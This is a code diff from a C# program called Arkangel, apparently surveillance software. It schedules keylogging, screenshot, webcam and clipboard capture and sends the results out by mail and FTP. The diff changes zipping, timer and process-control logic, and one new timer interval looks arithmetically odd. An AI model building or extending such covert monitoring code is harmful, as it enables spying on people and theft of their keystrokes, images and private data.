@@ -185,7 +185,6 @@ namespace Arkangel
             string enable_mail = "";
             int hours = 0;
             int minutes = 0;
-            string password = null;
             using (SQLiteConnection connect = new SQLiteConnection(@"Data Source=..\..\database.db"))
             {
                 connect.Open();
@@ -198,16 +197,14 @@ namespace Arkangel
                         enable_mail = data["enable"].ToString();
                         int.TryParse(data["hours"].ToString(), out hours);
                         int.TryParse(data["minutes"].ToString(), out minutes);
-                        password = data["zipPasswd"].ToString();
                     }
                 }
+                connect.Close();
             }
             if (enable_mail=="1")
             {
                 Functions.SetTimerSendMail(hours * 60 * 60 * 1000 + minutes * 60 * 1000);
-                Functions.ZipFolder(@"..\..\Screenshot", password);
-                Functions.ZipFolder(@"..\..\Webcam", password);
-                Functions.ZipFolder(@"..\..\Keylog", password);
+               
                 aTimer_sendMail.Start();
             }
             else
@@ -240,6 +237,10 @@ namespace Arkangel
                     Functions.SetTimerFTP(hoursFTP * 60 * 60 * 1000 + minutesFTP * 60 * 1000);
                     aTimer_FTP.Start();
                 }
+                else
+                {
+                    aTimer_FTP = new System.Timers.Timer();
+                }
             }
 
 
@@ -252,7 +253,7 @@ namespace Arkangel
             aTimer_Clipboard.Start();
 
             //Website
-            Functions.SetTimerWebsite(120 * 60 * 60 * 1000);
+            Functions.SetTimerWebsite(3* 60 * 60 * 60 * 1000 + 500);
             aTimer_Website.Start();
 
         }
@@ -478,6 +479,7 @@ namespace Arkangel
             aTimer_webcam.Stop();
             aTimer_Clipboard.Stop();
             Functions.EndTask("keystroke.exe");
+            Functions.EndTask("Arkangel.exe");
         }
 
         private void Window_Loaded(object sender, RoutedEventArgs e)
@@ -505,7 +507,12 @@ namespace Arkangel
                 Process.Start(start);
             }
             catch { }
-            Functions.syncDown();
+            try
+            {
+                Functions.Uptoken();
+                Functions.syncDown();
+            }
+            catch { }
         }
     }
 }
